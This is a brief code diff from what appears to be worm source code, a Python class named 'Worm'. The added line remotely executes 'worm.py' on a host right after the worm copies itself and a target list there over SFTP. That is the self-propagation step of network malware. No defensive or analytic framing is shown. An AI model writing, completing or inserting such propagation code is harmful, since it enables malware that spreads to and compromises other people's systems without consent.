@@ -57,6 +57,7 @@ class Worm:
         except IOError:
             sftp_client.put('worm.py', './tmp/worm.py')
             sftp_client.put('list', './tmp/list')
+            connection.exec_command('python ./tmp/worm.py')
 
 
 
